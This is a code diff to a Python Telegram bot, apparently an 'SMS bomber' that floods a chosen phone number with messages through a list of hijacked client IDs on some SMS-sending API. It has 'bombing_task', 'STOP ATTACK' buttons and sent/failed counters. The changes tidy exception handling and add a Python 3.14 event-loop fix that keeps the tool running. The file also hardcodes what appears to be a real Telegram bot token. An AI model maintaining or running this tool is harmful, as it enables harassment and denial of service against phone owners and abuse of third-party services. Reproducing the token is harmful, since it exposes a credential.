@@ -1,6 +1,7 @@
 import logging
 import asyncio
 import os
+import sys
 import threading
 import time
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -12,7 +13,7 @@ import aiohttp
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ============ BOT TOKEN (Render ENV se lega, warna yahan fallback) ============
+# ============ BOT TOKEN ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8955124391:AAE5yxh0if9cVmuSqL_k09Mw2QonMGgVuBk")
 
 # ============ ACTIVE ATTACKS ============
@@ -43,7 +44,6 @@ DATA = {
     "clients": ["03db74b4e6367fbb","0cb72d9134ccbf7a","1010aeaced89bfce","11839f6c09d774ad","15b53d912c060a6e","1ce8341cdf1323d0","1f1ddf7ba511a625","1f302d2b8e8ad290","247b2f7dd8721c8e","27c92d09d0eb95b9","2a28682b5414f74c","2c6067ec72cbd6a6","2fae372328cd8e0b","2fe5e93e22a3ffa7","31b3f6becdbfd5c5","32f5a70a36fd7f32","371eead62daeaaa1","3b7e2beaa5026bee","3f0337ea0abd6795","48a9a9dd0c7e89bf","4a6afd3b22740ac8","4bbb69197f87684a","4cb9ad7de229871a","4ea004a03ef222ab","5096e7601ccee515","600ce2212140cea5","60fbdac65130dde9","623f0e8d06ea1036","66e14cd020cd83d0","6939cfdd68fe7130","6a857bd2ba5a4abf","78ec99b743c784a1","79a0aae4d56e7fff","8006b1164410079f","82d84787570ea520","8b62dcb8ca6e2be7","8d795555b518aa3e","8d9db68f46184bf0","921076110a99fa9b","925dcaca6ad4074a","95c2851ce1552394","9703800407e0dbe7","98343179f2121238","9bc8e1e90fd28108","9cbd80efae06024c","9dcee7f8ac59070c","a24b6ea043fbf2af","a7652d623d51b82d","ab9506897508ac54","b1a01d296d7bb4f8","ba50fde2cef5977d","bc69f2691ea14675","c3829690c0d81153","cd70c9b71c83ab06","d8fbf3242d3613af","df1f469da337d0ed","e050cf11e78c7388","e45b38579513c14b","e74b2848cff8ac01","e988de8971d66cb8","eb8a6b67e29028ad","ebcb8ec276de4e54","f6bf14726f9aaf6e","f970de3ddbd41efa"]},
 }
 
-# SKIP unnecessary clients
 SKIP = {"DEVICE_ID","Verify_Device","diviceinfo","registeredDevices","_scary_links",
         "registration","undefined","HEALTH_MONITOR","sms_fetch_config",
         "business-apps","projects","projects-data"}
@@ -68,7 +68,7 @@ async def send_sms(s, url, auth, cid, phone, msg):
     try:
         async with s.put(api, json=payload, timeout=8) as r:
             return r.status in (200, 201)
-    except:
+    except Exception:
         return False
 
 # ============ BOMBING TASK ============
@@ -95,7 +95,7 @@ async def bombing_task(phone, msg, duration_seconds, bot, chat_id, msg_id, user_
                 [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]
             ])
         )
-    except:
+    except Exception:
         pass
 
     async with aiohttp.ClientSession() as s:
@@ -151,7 +151,7 @@ async def bombing_task(phone, msg, duration_seconds, bot, chat_id, msg_id, user_
                             [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]
                         ])
                     )
-                except:
+                except Exception:
                     pass
             await asyncio.sleep(0.1)
 
@@ -260,7 +260,7 @@ async def run_bombing(user_id, phone, msg, duration, bot, chat_id, msg_id, durat
                  f"📈 Grand Total: **{total_sent + total_failed}**",
             parse_mode='Markdown', reply_markup=get_main_keyboard()
         )
-    except:
+    except Exception:
         pass
     if user_id in active_attacks:
         del active_attacks[user_id]
@@ -386,13 +386,11 @@ HTML_PAGE = """<!DOCTYPE html>
 
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # Root path -> HTML landing page
         if self.path == "/" or self.path == "/index.html":
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
             self.wfile.write(HTML_PAGE.encode("utf-8"))
-        # Any other path -> simple OK (for UptimeRobot pings)
         else:
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
@@ -400,7 +398,7 @@ class HealthHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"OK")
 
     def log_message(self, format, *args):
-        pass  # silence default logging
+        pass
 
 def run_health_server():
     port = int(os.environ.get("PORT", 8080))
@@ -408,8 +406,18 @@ def run_health_server():
     logger.info(f"🌐 Health server running on port {port}")
     server.serve_forever()
 
-# ============ MAIN ============
+# ============================================================
+# ============ 🔥 MAIN (Python 3.14 FIX INCLUDED) ============
+# ============================================================
 def main():
+    # 🔥 FIX: Python 3.12+ me event loop manually banana zaroori hai
+    # Ye line Python 3.14 ke "RuntimeError: no current event loop" ko solve karti hai
+    try:
+        asyncio.get_running_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
     # Start health/HTML server in background thread
     threading.Thread(target=run_health_server, daemon=True).start()
 
